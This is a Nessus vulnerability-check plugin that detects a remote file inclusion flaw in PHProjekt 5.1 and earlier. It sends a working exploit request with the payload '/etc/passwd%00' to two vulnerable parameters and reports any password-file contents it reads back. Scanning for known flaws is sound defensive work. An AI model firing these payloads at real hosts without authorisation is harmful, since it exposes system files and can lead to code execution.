#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(22271);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2006-4204");
  script_bugtraq_id(19541);
  script_xref(name:"OSVDB", value:"27952");
  script_xref(name:"OSVDB", value:"27953");

  script_name(english:"PHProjekt <= 5.1 Multiple Remote File Inclusions");
  script_summary(english:"Tries to read a local file using PHProjekt");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to
multiple remote file include attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running PHProjekt, an open-source groupware suite
written in PHP. 

The version of PHProjekt installed on the remote host fails to
sanitize user-supplied input to the 'path_pre' parameter of the
'lib/specialdays.php' script as well as the 'lib_path' parameter of
the 'lib/dbman_filter.inc.php' script before using it to include PHP
code.  Provided PHP's 'register_globals' setting is enabled, an
unauthenticated attacker can exploit these flaws to view arbitrary
files on the remote host or to execute arbitrary PHP code, possibly
taken from third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://milw0rm.com/exploits/2190" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?abc3f4a3" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to PHProjekt version 5.1.1 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/phprojekt", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try various exploits.
  if (thorough_tests) exploits = make_list(
    "/lib/dbman_filter.inc.php?lib_path=",
    "/lib/specialdays.php?path_pre="
  );
  else exploits = make_list(
    "/lib/dbman_filter.inc.php?lib_path="
  );
  foreach exploit (exploits)
  {
    file = "/etc/passwd%00";
    r = http_send_recv3(method:"GET", item:string(dir, exploit, file), port:port);
    if (isnull(r)) exit(0);
    res = r[2];

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream".
      egrep(pattern:"main\(/etc/passwd\\0/(lib|selector)/.+ failed to open stream", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
    )
    {
      if (egrep(string:res, pattern:"root:.*:0:[01]:"))
        contents = res;

      if (contents)
      {
        report = string(
          "\n",
          "Here are the contents of the file '/etc/passwd' that Nessus\n",
          "was able to read from the remote host :\n",
          "\n",
          contents
        );
        security_hole(port:port, extra:report);
      }
      else security_hole(port);

      exit(0);
    }
  }
}

